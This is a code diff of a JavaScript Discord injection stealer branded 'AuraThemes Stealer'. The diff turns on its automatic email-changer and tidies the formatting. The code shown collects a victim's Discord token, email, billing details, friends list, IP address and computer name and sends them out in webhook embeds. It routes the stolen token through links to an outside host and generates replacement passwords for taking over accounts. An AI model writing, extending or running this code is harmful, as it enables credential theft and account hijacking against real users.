@@ -18,7 +18,7 @@ var config = {
   "init-notify": "true",
   "embed-color": parseInt("#c267ff".replaceAll("#", ""), 16),
   disable2FA: "%DISABLEFA%",
-  changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
+  changeMailAuto: "",//%AUTOMAILCHANGER%
   mail: "%CLIENTEMAIL%",
   creator: "%NAME_CREATOR%",
   transfer_link: `%TRANSFER_URL%`,
@@ -88,14 +88,12 @@ const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
         author: {
           name: `AuraThemes Stealer`,
         },
-
         footer: {
-          text: ` [${config.creator}] | https://discord.gg/aurathemes`,
+          text: ` [${config.creator == "%NAME_" + "CREATOR%" ? "k4itrun" : "%NAME_CREATOR%"}] | https://discord.gg/aurathemes`,
         },
       },
     ],
   };
-
   if (image)
     params.embeds[0].image = {
       url: image,
@@ -114,24 +112,19 @@ const getIP = () => {
       path: "/?format=json",
       method: "GET",
     };
-
     const req = https.request(options, (res) => {
       let data = "";
-
       res.on("data", (chunk) => {
         data += chunk;
       });
-
       res.on("end", () => {
         const json = JSON.parse(data);
         resolve(json.ip);
       });
     });
-
     req.on("error", (error) => {
       reject(error);
     });
-
     req.end();
   });
 };
@@ -148,7 +141,6 @@ const getURL = async (url, token) => {
 
 const getGifOrPNG = async (url) => {
   var tt = [".gif?size=512", ".png?size=512"];
-
   var headers = await new Promise((resolve) => {
     https.get(url, (res) => resolve(res.headers));
   });
@@ -516,11 +508,9 @@ function updatePassword(token, oldpassword, newpassword) {
 
 function generatePassword() {
   const baseWords = ["AuraThemes123", "Aura", "k4itrun", "Truchorko"];
-  const randomBaseWord =
-    baseWords[Math.floor(Math.random() * baseWords.length)];
+  const randomBaseWord = baseWords[Math.floor(Math.random() * baseWords.length)];
   const randomNumberCount = Math.floor(Math.random() * 9) + 1;
-  const randomLettersCount =
-    Math.floor(Math.random() * (randomBaseWord.length - 1)) + 2;
+  const randomLettersCount = Math.floor(Math.random() * (randomBaseWord.length - 1)) + 2;
   const randomSymbolCount = Math.floor(Math.random() * 2) + 1;
   let password = "";
   password += randomBaseWord;
@@ -576,10 +566,9 @@ const FirstTime = async () => {
       var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile",token);
       var Billings = parseBilling(billing);
       var Friends = parseFriends(friends);
-      if (!user.avatar)
-        var userAvatar = "https://i.imgur.com/yVnOSeS.gif";
-      if (!user.banner)
-        var userBanner = "https://i.imgur.com/CeFqJOc.gif";
+
+      if (!user.avatar) var userAvatar = "https://i.imgur.com/yVnOSeS.gif";
+      if (!user.banner) var userBanner = "https://i.imgur.com/CeFqJOc.gif";
 
       userBanner = userBanner ?? (
         await getGifOrPNG(`https://cdn.discordapp.com/banners/${user.id}/${user.banner}`)
@@ -593,16 +582,8 @@ const FirstTime = async () => {
         title: " AuraThemes Stealer Initialized",
         description: `\`\`\` - Computer Name: ${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\``,
         fields: [
-          {
-            name: "Username",
-            value: `\`${user.username}#${user.discriminator}\``,
-            inline: !0,
-          },
-          {
-            name: "ID",
-            value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`,
-            inline: !0,
-          },
+          { name: "Username", value: `\`${user.username}#${user.discriminator}\``, inline: !0 },
+          { name: "ID", value: `\`${user.id}\`\n[Copy ID](https://6889.fun/api/aurathemes/raw?data=${user.id})`, inline: !0 },
           {
             name: "Nitro",
             value: `${GetNitro(Nitro)}`,
@@ -648,15 +629,7 @@ const FirstTime = async () => {
             value: `\`${user.email ?? "none"}\``,
             inline: !0,
           },
-          {
-            name: "Bio ",
-            value: `\`\`\`${
-              user.bio !== null && user.bio !== undefined && user.bio !== ""
-                ? user.bio
-                : ":x:"
-            }\`\`\``,
-            inline: false,
-          },
+          { name: "Bio ", value: `\`\`\`${ user.bio !== null && user.bio !== undefined && user.bio !== "" ? user.bio : ":x:" }\`\`\``, inline: false },
           {
             name: "TOKEN",
             value: `\`\`\`${token}\`\`\`\n[Copy Token](https://6889.fun/api/aurathemes/raw?data=${token})\n\n[Download Banner](${userBanner})`,
